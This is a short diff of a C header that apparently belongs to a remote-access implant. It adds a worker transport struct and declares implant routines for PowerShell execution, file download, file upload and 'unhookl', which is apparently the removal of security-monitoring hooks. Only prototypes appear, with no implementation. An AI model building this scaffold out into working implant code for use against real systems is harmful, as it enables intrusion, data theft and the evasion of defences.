@@ -19,6 +19,11 @@ struct jobs_t {
     HANDLE* main_thread_handle;
 };
 
+struct wrkr_trans_t {
+    tremont_stream_id stream_id;
+    Tremont_Nexus* nexus;
+};
+
 int track_job(HANDLE* job_thread, struct jobs_t* jobs);
 
 void untrack_job(HANDLE* job_thread, struct jobs_t* jobs);
@@ -26,4 +31,11 @@ void untrack_job(HANDLE* job_thread, struct jobs_t* jobs);
 void implant_powershell(tremont_stream_id stream_id,
 	Tremont_Nexus* nexus);
 
-int implant_download(struct download_req_t* req);
+int implant_download(struct wrkr_trans_t* trans, 
+    struct download_req_t* req);
+
+int implant_upload(struct wrkr_trans_t* trans,
+    struct upload_req_t* req);
+
+int implant_unhookl(struct wrkr_trans_t* trans,
+    struct unhookl_req_t* req);
